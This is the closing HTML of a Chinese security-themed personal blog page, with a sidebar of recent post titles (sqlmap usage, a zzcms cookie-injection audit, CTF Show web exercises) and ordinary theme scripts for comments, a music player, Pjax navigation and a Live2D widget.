class="thumbnail" href="/2023/05/04/sqlmap%E4%BD%BF%E7%94%A8/" title="sqlmap使用"><img src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/SQL_Injection.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="sqlmap使用"/></a><div class="content"><a class="title" href="/2023/05/04/sqlmap%E4%BD%BF%E7%94%A8/" title="sqlmap使用">sqlmap使用</a><time datetime="2023-05-04T15:51:00.000Z" title="发表于 2023-05-04 23:51:00">2023-05-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/05/04/zzcms-cookie%E6%B3%A8%E5%85%A5%E5%AE%A1%E8%AE%A1/" title="zzcms-cookie注入审计"><img src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/hacker.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="zzcms-cookie注入审计"/></a><div class="content"><a class="title" href="/2023/05/04/zzcms-cookie%E6%B3%A8%E5%85%A5%E5%AE%A1%E8%AE%A1/" title="zzcms-cookie注入审计">zzcms-cookie注入审计</a><time datetime="2023-05-04T15:17:00.000Z" title="发表于 2023-05-04 23:17:00">2023-05-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/29/0106%20CTF%20Show-Web%E5%85%A5%E9%97%A8/" title="CTF Show-Web入门"><img src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/ctf.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTF Show-Web入门"/></a><div class="content"><a class="title" href="/2023/04/29/0106%20CTF%20Show-Web%E5%85%A5%E9%97%A8/" title="CTF Show-Web入门">CTF Show-Web入门</a><time datetime="2023-04-29T08:36:00.000Z" title="发表于 2023-04-29 16:36:00">2023-04-29</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/hacker.webp')"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2023 By zha0fe1</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><div class="aplayer no-destroy" data-id="7839668682" data-server="netease" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="none" data-autoplay="false" data-volume="0.5" muted></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="野鹤,纷飞,日暮,不思归" data-fontsize="15px" data-random="false" async="async"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
